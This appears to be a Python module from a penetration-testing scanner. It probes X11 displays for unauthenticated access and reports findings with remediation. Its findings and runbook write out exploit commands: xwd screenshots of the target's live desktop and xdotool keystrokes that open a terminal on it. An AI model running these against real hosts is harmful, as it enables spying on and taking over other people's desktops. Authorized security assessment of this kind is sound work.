"""X11 (6000-6009/tcp): unauthenticated display access.

An X server that accepts a connection from an untrusted client is game over on
that desktop: keystrokes, screenshots, synthetic input. The one-shot check is
the initial byte-order + MAJOR_PROTOCOL_VERSION handshake — an X server that
would accept an authenticated client on this segment responds; one gated by
xhost/xauth refuses with a specific reason string in the handshake reply.

T2 promotion (safe proof-of-exploit): after a Success handshake we drain the
server-info block, extract the first root WINDOW id, and issue a single
GetGeometry(root) request (opcode 14). A successful 32-byte reply proves the
session is real live protocol access — not just a handshake ack — while doing
no writes, no framebuffer read, and no synthetic input.

Wire format: X protocol §8 (connection setup) + §9 (GetGeometry). Stdlib
socket + struct only.
"""
from __future__ import annotations

import socket
import struct

from ..core.models import Host, Port


_DEFAULT_PORT = 6000
_TIMEOUT = 3.0

# X protocol opcode for GetGeometry (X §9).
_OP_GET_GEOMETRY = 14


def is_x11(port: Port) -> bool:
    svc = (port.service or "").lower()
    return 6000 <= port.portid <= 6009 or svc.startswith("x11")


def _recv_exact(s: socket.socket, n: int, timeout: float) -> bytes:
    """Read exactly n bytes or return whatever arrived before EOF/timeout."""
    s.settimeout(timeout)
    buf = b""
    while len(buf) < n:
        try:
            chunk = s.recv(n - len(buf))
        except OSError:
            return buf
        if not chunk:
            return buf
        buf += chunk
    return buf


def _parse_setup_success(body: bytes) -> dict | None:
    """Parse the Setup Success 'additional data' body (X §8).

    Returns the first SCREEN's root WINDOW id plus width/height/depth so the
    caller can issue GetGeometry(root). All multi-byte fields are big-endian
    because the client requested byte-order 'B'.
    """
    if len(body) < 32:
        return None
    # Fixed prefix is 28 bytes (four u32s, two u16s, eight u8s), followed by
    # 4 unused bytes that pad the header up to offset 32.
    (rel, rid_base, rid_mask, motion_buf,
     vendor_len, max_req_len,
     num_roots, num_formats,
     img_bo, bmp_bo, scl_unit, scl_pad,
     min_kc, max_kc) = struct.unpack(">IIIIHHBBBBBBBB", body[:28])
    off = 32
    vendor_pad = (4 - (vendor_len % 4)) % 4
    off += vendor_len + vendor_pad
    off += num_formats * 8
    # SCREEN: root(4) colormap(4) white(4) black(4) input(4)
    # width(2) height(2) wmm(2) hmm(2) minmap(2) maxmap(2)
    # visual(4) backing(1) saveunders(1) depth(1) numdepths(1) = 40 bytes.
    if num_roots < 1 or len(body) < off + 40:
        return None
    root = struct.unpack(">I", body[off:off + 4])[0]
    width, height = struct.unpack(">HH", body[off + 20:off + 24])
    root_depth = body[off + 38]
    return {"root": root, "width": width, "height": height,
            "depth": root_depth, "screens": num_roots}


def _get_geometry(s: socket.socket, drawable: int,
                  timeout: float) -> dict | None:
    """Send GetGeometry(drawable) (opcode 14, len=2 in 4-byte units).

    Reply is 32 bytes: type(1) depth(1) seq(2) reply_len(4) root(4)
    x(2) y(2) width(2) height(2) border(2) unused(10). No pixels, no writes.
    """
    req = struct.pack(">BBHI", _OP_GET_GEOMETRY, 0, 2, drawable)
    try:
        s.settimeout(timeout)
        s.sendall(req)
    except OSError:
        return None
    data = _recv_exact(s, 32, timeout)
    if len(data) < 32:
        return None
    # Reply=1, Error=0. Only Reply counts as a live-protocol proof.
    if data[0] != 1:
        return None
    depth = data[1]
    root = struct.unpack(">I", data[8:12])[0]
    x, y = struct.unpack(">hh", data[12:16])
    width, height, border = struct.unpack(">HHH", data[16:22])
    return {"depth": depth, "root": root, "x": x, "y": y,
            "width": width, "height": height, "border": border}


def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict:
    """Handshake with an empty authentication protocol name.

    An X server with no access control (xhost + / -nolisten missing) returns
    status=1 (accepted) plus a full server info block. One protected by MIT-
    MAGIC-COOKIE returns status=0 (refused) with an explanatory reason string
    such as 'No protocol specified' — that itself is the discovery signal
    since a non-X port never returns either shape.

    On status=1 we follow up with a safe T2 proof: read the additional server
    info, extract the first root window id, and issue GetGeometry(root). No
    writes, no framebuffer capture, no synthetic input.
    """
    out: dict = {"reachable": False}
    # Byte-order 'B' (0x42, big-endian) + pad + major(11) + minor(0) + name/data lengths(0) + pad
    req = struct.pack(">BBHHHH", 0x42, 0, 11, 0, 0, 0) + b"\x00\x00"
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
    except OSError:
        return out
    try:
        s.settimeout(timeout)
        try:
            s.sendall(req)
            hdr = _recv_exact(s, 8, timeout)
        except OSError:
            return out
        if len(hdr) < 8:
            return out
        status, extra_len, major, minor, addl = struct.unpack(">BBHHH", hdr)
        out["reachable"] = True
        out["major"] = major
        out["minor"] = minor
        if status == 1:
            out["accepted"] = True
            # T2 safe proof-of-exploit path (see module docstring).
            body = _recv_exact(s, addl * 4, timeout)
            if len(body) == addl * 4 and body:
                info = _parse_setup_success(body)
                if info is not None:
                    geom = _get_geometry(s, info["root"], timeout)
                    if geom is not None:
                        out["screen_geometry"] = {
                            "root": info["root"],
                            "width": geom["width"],
                            "height": geom["height"],
                            "depth": geom["depth"],
                            "screens": info["screens"],
                        }
        elif status == 0:
            # reason bytes may follow the header; just knowing status=0 is enough
            out["accepted"] = False
            out["refused_reason_len"] = extra_len
        else:
            out["accepted"] = False
            out["status"] = status
    finally:
        try:
            s.close()
        except OSError:
            pass
    return out


def x11_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_x11(p):
                out.append({"ip": h.ip, "port": p.portid,
                            "version": f"{p.product} {p.version}".strip()})
    return out


def _finding(sev, title, target, detail, tool, cmd, rem, cwes, kind="",
             exploit_note="", depth_tier="", output=""):
    return {"severity": sev, "title": title, "target": target, "detail": detail,
            "tool": tool, "command": cmd, "remediation": rem,
            "cwes": cwes, "kind": kind,
            "exploit_note": exploit_note, "depth_tier": depth_tier,
            "output": output}


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_x11(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr or not pr.get("reachable"):
                continue
            tgt = f"{h.ip}:{p.portid}"
            display = f":{p.portid - 6000}"
            if pr.get("accepted"):
                geom = pr.get("screen_geometry") or {}
                depth_tier = "t2" if geom else "t1"
                # T2 evidence in the detail + a dedicated output field.
                if geom:
                    proof = (
                        f" T2 proof: GetGeometry(root=0x{geom.get('root', 0):08x}) "
                        f"returned {geom.get('width')}x{geom.get('height')} "
                        f"at depth {geom.get('depth')} across "
                        f"{geom.get('screens')} screen(s) — live X protocol "
                        f"access confirmed by a single read-only request "
                        f"(no framebuffer capture, no input injection)."
                    )
                    output = (
                        f"GetGeometry(root=0x{geom.get('root', 0):08x}) -> "
                        f"width={geom.get('width')} height={geom.get('height')} "
                        f"depth={geom.get('depth')} screens={geom.get('screens')}"
                    )
                else:
                    proof = ""
                    output = ""
                out.append(_finding(
                    "critical",
                    "X11 display accepts unauthenticated connections", tgt,
                    f"The X server on {tgt} answered the initial handshake with "
                    f"status=Success and no authentication challenge (X protocol "
                    f"{pr.get('major')}.{pr.get('minor')}). Any client on this "
                    f"segment can read the framebuffer (screenshot), record "
                    f"keystrokes and inject synthetic input against display "
                    f"{display} on {h.ip}." + proof,
                    "xdotool / xwd / xspy",
                    f"DISPLAY={h.ip}{display} xwd -root -out /tmp/screen.xwd && "
                    f"convert /tmp/screen.xwd /tmp/screen.png   # screenshot the "
                    f"target's live desktop",
                    "Run X with -nolisten tcp (or the equivalent xorg.conf.d "
                    "override); if remote X is required, prefer SSH X11 "
                    "forwarding and require MIT-MAGIC-COOKIE.",
                    ["CWE-306", "CWE-284"], kind="x11_open",
                    exploit_note=(
                        "DISPLAY=<ip>:<display> xwd -root -out /tmp/scr.xwd "
                        "&& convert /tmp/scr.xwd /tmp/scr.png; then "
                        "DISPLAY=<ip>:<display> xdotool key ctrl+alt+t   "
                        "# spawn a terminal on the target's live desktop"),
                    depth_tier=depth_tier, output=output))
            else:
                # A refused handshake still confirms the port is X; useful for
                # discovery but not a finding on its own beyond low disclosure.
                out.append(_finding(
                    "low",
                    "X11 server present (authentication required)", tgt,
                    f"X protocol {pr.get('major', '?')}.{pr.get('minor', '?')} "
                    f"listener on {tgt} — refused the handshake, so xauth cookies "
                    f"or xhost restriction is in place. Still discloses that a "
                    f"desktop session is available on this host.",
                    "xdpyinfo",
                    f"DISPLAY={h.ip}{display} xdpyinfo   # will fail without a cookie",
                    "Restrict 6000-6009/tcp to trusted networks; if not required, "
                    "prefer -nolisten tcp.",
                    ["CWE-200"], kind="x11_present",
                    exploit_note=(
                        "nmap -sU -p 177 --script xdmcp-discover <ip>; and: "
                        "DISPLAY=<ip>:<display> xhost + 2>&1   "
                        "# test if the operator left xhost + on at some point"),
                    depth_tier="t0"))
    return out


def runbook(ip: str, port: int = _DEFAULT_PORT) -> list[dict]:
    display = f":{port - 6000}"
    return [
        {"phase": "enumerate", "tool": "xdpyinfo",
         "command": f"DISPLAY={ip}{display} xdpyinfo   # only works when access is open",
         "why": "confirm the display is reachable + read screen dimensions"},
        {"phase": "exploit", "tool": "xwd",
         "command": f"DISPLAY={ip}{display} xwd -root -out screen.xwd",
         "why": "one-shot screenshot of the target's live desktop"},
        {"phase": "exploit", "tool": "xdotool",
         "command": f"DISPLAY={ip}{display} xdotool key ctrl+alt+t",
         "why": "synthetic input — start a terminal on the target's desktop"},
    ]


def findings_to_vulns(fs: list[dict]) -> dict:
    from . import svccommon
    return svccommon.findings_to_vulns(fs, "x11", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None) -> dict:
    from . import svcprobe
    targets = x11_targets(hosts)
    probes: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = pr.get("reachable", False)
                t["accepted"] = pr.get("accepted", False)
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
